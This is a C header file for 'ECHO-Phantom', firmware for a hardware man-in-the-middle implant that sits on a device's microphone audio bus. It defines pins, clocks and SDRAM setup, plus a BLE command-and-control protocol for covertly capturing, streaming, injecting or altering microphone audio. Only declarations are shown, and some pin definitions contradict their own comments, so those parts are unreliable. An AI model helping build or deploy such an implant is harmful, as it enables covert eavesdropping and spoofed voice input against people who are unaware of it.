/*
 * board.h — Board Configuration for ECHO-Phantom
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * Pin assignments, clock configuration, and hardware constants
 * for the ECHO-Phantom I²S/TDM audio bus MITM implant.
 */

#ifndef BOARD_H
#define BOARD_H

#include <stdint.h>
#include "registers.h"

/* ========================================================================
 *  Board Identity
 * ======================================================================== */

#define BOARD_NAME      "ECHO-Phantom"
#define BOARD_VERSION   "1.0.0"
#define BOARD_AUTHOR    "jayis1"

/* ========================================================================
 *  Clock Configuration
 *  HSE 25 MHz → PLL1 → SYSCLK 480 MHz
 *  SAI1 clock from PLL3 (audio-grade fractional PLL)
 * ======================================================================== */

#define HSE_FREQ_HZ     25000000U
#define SYSCLK_HZ       480000000U
#define HCLK_HZ         240000000U
#define APB1_HZ         120000000U
#define APB2_HZ         120000000U

/* PLL3 for SAI1: 25 MHz / 5 * 96 / 9 = 53.333 MHz → SAI MCLK 12.288 MHz */
#define SAI_MCLK_HZ     12288000U
#define SAI_BCLK_48KHZ  1536000U    /* 48kHz × 32-bit stereo */
#define SAI_BCLK_96KHZ  3072000U    /* 96kHz × 32-bit stereo */

/* ========================================================================
 *  Pin Assignments — Target Side (SAI1 Block A — RX from microphone)
 * ======================================================================== */

/* SAI1_A pins (AF6) */
#define SAI1_BCLK_PIN   8       /* PA8  — SAI1_CK_A  (BCLK from mic)  */
#define SAI1_WS_PIN     7       /* PA7  — SAI1_FS_A  (WS from mic)    */
#define SAI1_SD_PIN     3       /* PB3  — SAI1_SD_A  (SDATA from mic) */
#define SAI1_MCLK_PIN   15      /* PC7  — SAI1_MCLK_A (MCLK, opt.)    */

/* SAI1_A GPIO bases */
#define SAI1_BCLK_GPIO   GPIOA_BASE
#define SAI1_WS_GPIO     GPIOA_BASE
#define SAI1_SD_GPIO     GPIOB_BASE
#define SAI1_MCLK_GPIO   GPIOC_BASE

/* ========================================================================
 *  Pin Assignments — Host Side (SAI1 Block B — TX to AP/DSP)
 * ======================================================================== */

#define SAI1B_BCLK_PIN   9       /* PA9 — but shared with USART1 TX; use alternate: PB10 */
#define SAI1B_WS_PIN     4       /* PF4 — SAI1_FS_B */
#define SAI1B_SD_PIN     5       /* PE6 — SAI1_SD_B */
#define SAI1B_MCLK_PIN   14      /* PC14 — SAI1_MCLK_B */

/* Actually, let's use the dedicated SAI1 Block B pins:
 * PB10 = SAI1_CK_B (AF6), but PB10 is used for USART3_TX.
 * Let's use proper SAI1_B pins on STM32H743:
 * SAI1_CK_B  → PA9 (AF6) - but conflicts with USART1 TX
 * SAI1_FS_B  → PF4 (AF6)
 * SAI1_SD_B  → PE6 (AF6)
 * SAI1_MCLK_B → PC14 (AF6) - but conflicts with RTC
 *
 * Better: use PA9 for USART1, and route SAI1_B to:
 * SAI1_SD_B → PE6 (AF6)
 * SAI1_FS_B → PF4 (AF6)
 * SAI1_CK_B → PB10 (AF6)
 */

#undef SAI1B_BCLK_PIN
#define SAI1B_BCLK_PIN   10      /* PB10 — SAI1_CK_B (BCLK to host)   */
#define SAI1B_BCLK_GPIO  GPIOB_BASE
#define SAI1B_WS_GPIO    GPIOF_BASE
#define SAI1B_SD_GPIO    GPIOE_BASE

/* ========================================================================
 *  LED Indicators
 * ======================================================================== */

#define LED_RED_GPIO    GPIOB_BASE
#define LED_RED_PIN     0
#define LED_BLUE_GPIO   GPIOB_BASE
#define LED_BLUE_PIN    1

#define LED_RED_ON()    GPIO_ODR(LED_RED_GPIO) &= ~(1U << LED_RED_PIN)
#define LED_RED_OFF()   GPIO_ODR(LED_RED_GPIO) |= (1U << LED_RED_PIN)
#define LED_RED_TOGGLE() GPIO_ODR(LED_RED_GPIO) ^= (1U << LED_RED_PIN)

#define LED_BLUE_ON()   GPIO_ODR(LED_BLUE_GPIO) &= ~(1U << LED_BLUE_PIN)
#define LED_BLUE_OFF()  GPIO_ODR(LED_BLUE_GPIO) |= (1U << LED_BLUE_PIN)
#define LED_BLUE_TOGGLE() GPIO_ODR(LED_BLUE_GPIO) ^= (1U << LED_BLUE_PIN)

/* ========================================================================
 *  USART1 (BLE C2 link to nRF52840)
 *  PA9 = TX, PA10 = RX, AF7, baud 115200
 * ======================================================================== */

#define BLE_UART_TX_GPIO  GPIOA_BASE
#define BLE_UART_TX_PIN   9
#define BLE_UART_RX_GPIO   GPIOA_BASE
#define BLE_UART_RX_PIN   10
#define BLE_UART_BAUD     115200U

/* ========================================================================
 *  USB CDC (USB OTG1)
 *  PA11 = DM, PA12 = DP, AF10
 * ======================================================================== */

#define USB_DM_GPIO    GPIOA_BASE
#define USB_DM_PIN     11
#define USB_DP_PIN     12

/* ========================================================================
 *  ADC (for battery monitoring)
 *  ADC1 CH10 = PF10 (Vbat divider)
 * ======================================================================== */

#define VBAT_ADC_GPIO   GPIOF_BASE
#define VBAT_ADC_PIN    10

/* ========================================================================
 *  Audio Constants
 * ======================================================================== */

#define AUDIO_MAX_SAMPLE_RATE   192000U
#define AUDIO_MAX_CHANNELS      16
#define AUDIO_MAX_BIT_DEPTH     32
#define AUDIO_FRAME_SAMPLES     64      /* samples per DMA buffer half */
#define AUDIO_DMA_BUF_SIZE      256     /* 64 samples × 4 bytes = 256 bytes per half */

#define CAPTURE_BUF_SIZE_BYTES  (128U * 1024U * 1024U)  /* 128 MB SDRAM */
#define CAPTURE_BUF_SAMPLES     (CAPTURE_BUF_SIZE_BYTES / 4)

#define INJECT_MAX_CLIPS        16
#define INJECT_FLASH_BASE       0x08080000U  /* Bank 2 sector 0 */
#define INJECT_FLASH_SIZE       (1024U * 1024U)  /* 1 MB for clips in bank 2 */

/* ========================================================================
 *  SDRAM Configuration (IS42S16160G — 128 MB, 16-bit)
 * ======================================================================== */

#define SDRAM_BANK_ADDR         0xD0000000U
#define SDRAM_SIZE_BYTES        (128U * 1024U * 1024U)
#define SDRAM_BANKS             2
#define SDRAM_ROWS              8192
#define SDRAM_COLS              512
#define SDRAM_DENSITY           16  /* 16-bit data bus */

/* SDRAM timing (cycles at 120 MHz FMC clock) */
#define SDRAM_TMRD              2
#define SDRAM_TXSR              7
#define SDRAM_TRAS              5
#define SDRAM_TRC               7
#define SDRAM_TWR               2
#define SDRAM_TRP               3
#define SDRAM_TRCD              3

/* ========================================================================
 *  BLE Protocol Commands
 * ======================================================================== */

#define CMD_PING                0x01
#define CMD_GET_STATUS          0x02
#define CMD_GET_FORMAT          0x03
#define CMD_START_CAPTURE       0x04
#define CMD_STOP_CAPTURE        0x05
#define CMD_START_INJECT        0x06
#define CMD_STOP_INJECT         0x07
#define CMD_UPLOAD_CLIP         0x08
#define CMD_SET_MODE            0x09
#define CMD_SET_FILTER          0x0A
#define CMD_STREAM_START        0x0B
#define CMD_STREAM_STOP         0x0C
#define CMD_ERASE_CLIPS         0x0D
#define CMD_GET_BATTERY         0x0E
#define CMD_FACTORY_RESET       0x0F
#define CMD_LIST_CLIPS          0x10
#define CMD_PLAY_CLIP_PREV      0x11

/* ========================================================================
 *  Operating Modes
 * ======================================================================== */

typedef enum {
    MODE_PASSTHROUGH = 0,    /* Mic audio passes through unmodified */
    MODE_CAPTURE,            /* Capture mic audio to SDRAM/SD */
    MODE_INJECT,             /* Replace mic audio with injected clip */
    MODE_MODIFY,             /* Real-time DSP modification of mic audio */
    MODE_OFFLINE,            /* Bus disconnected — implant transparent */
} echo_mode_t;

/* ========================================================================
 *  Audio Format
 * ======================================================================== */

typedef struct {
    uint32_t sample_rate;   /* Hz (8000–192000) */
    uint8_t  bit_depth;     /* 16, 24, or 32 */
    uint8_t  channels;      /* 1–16 (TDM) */
    uint8_t  protocol;      /* 0=I²S Philips, 1=LJ, 2=RJ, 3=PCM short, 4=PCM long, 5=TDM */
    uint8_t  _reserved;
} audio_format_t;

/* Audio protocol types */
#define PROTO_I2S_PHILIPS  0
#define PROTO_LJ           1
#define PROTO_RJ           2
#define PROTO_PCM_SHORT    3
#define PROTO_PCM_LONG     4
#define PROTO_TDM          5

/* ========================================================================
 *  Injection modes
 * ======================================================================== */

typedef enum {
    INJECT_REPLACE = 0,    /* Fully replace mic audio with clip */
    INJECT_MIX,            /* Mix clip with mic audio at gain ratio */
    INJECT_OVERLAY,        /* Overlay — clip on top, mic still audible */
} inject_mode_t;

/* ========================================================================
 *  Capture destination
 * ======================================================================== */

typedef enum {
    CAP_DEST_SD = 0,
    CAP_DEST_BLE,
    CAP_DEST_USB,
    CAP_DEST_SDRAM,
} cap_dest_t;

/* ========================================================================
 *  Device Status (reported to app)
 * ======================================================================== */

typedef struct {
    uint32_t    uptime_s;
    echo_mode_t mode;
    audio_format_t format;
    uint32_t    capture_frames;
    uint32_t    capture_bytes;
    uint32_t    buffer_fill;       /* 0–100 percent */
    uint16_t    battery_mv;
    uint8_t     battery_pct;
    uint8_t     charging;
    uint8_t     sd_present;
    uint8_t     ble_connected;
    uint8_t     usb_connected;
} device_status_t;

/* ========================================================================
 *  Function declarations (implemented in drivers/)
 * ======================================================================== */

void board_init(void);
void clock_init(void);
void gpio_init(void);

/* SAI audio */
int  sai_audio_init(const audio_format_t *fmt);
void sai_audio_start(void);
void sai_audio_stop(void);
int  sai_audio_rx(uint32_t *buf, uint16_t samples);
int  sai_audio_tx(const uint32_t *buf, uint16_t samples);

/* Format detection */
int  format_detect(audio_format_t *fmt);

/* Audio DSP */
void audio_dsp_init(void);
void audio_dsp_process(int32_t *buf, uint16_t samples);
void audio_dsp_set_filter(uint8_t type, const int32_t *coeffs, uint8_t n);
void audio_dsp_mix(int32_t *dst, const int32_t *src, uint16_t samples, uint8_t gain);

/* Capture */
int  capture_init(cap_dest_t dest);
int  capture_start(void);
void capture_stop(void);
void capture_feed(const int32_t *buf, uint16_t samples);
uint32_t capture_get_frames(void);
uint32_t capture_get_bytes(void);

/* Injection */
int  inject_init(void);
int  inject_load_clip(uint8_t clip_id, const uint8_t *data, uint32_t size);
int  inject_start(uint8_t clip_id, inject_mode_t mode, uint8_t gain);
void inject_stop(void);
int  inject_get_next_frame(int32_t *buf, uint16_t samples);

/* BLE C2 */
void ble_c2_init(void);
int  ble_c2_send(const uint8_t *data, uint16_t len);
int  ble_c2_recv(uint8_t *buf, uint16_t maxlen);
void ble_c2_poll(void);
uint8_t ble_c2_connected(void);

/* USB CDC */
void usb_cdc_init(void);
int  usb_cdc_send(const uint8_t *data, uint16_t len);
int  usb_cdc_recv(uint8_t *buf, uint16_t maxlen);
uint8_t usb_cdc_connected(void);

/* SD card */
int  sdcard_init(void);
int  sdcard_wav_open(const char *name, const audio_format_t *fmt);
int  sdcard_wav_write(const int32_t *samples, uint32_t count);
int  sdcard_wav_close(void);
uint8_t sdcard_present(void);

/* SDRAM */
int  sdram_init(void);
void *sdram_alloc(uint32_t size);

/* Battery */
uint16_t battery_read_mv(void);
uint8_t battery_read_pct(void);
uint8_t battery_charging(void);

/* Flash (for inject clips) */
int  flash_erase_sector(uint32_t addr);
int  flash_write(uint32_t addr, const uint8_t *data, uint32_t len);

/* Utility */
void delay_ms(uint32_t ms);
uint32_t millis(void);
uint8_t crc8(const uint8_t *data, uint16_t len);

#endif /* BOARD_H */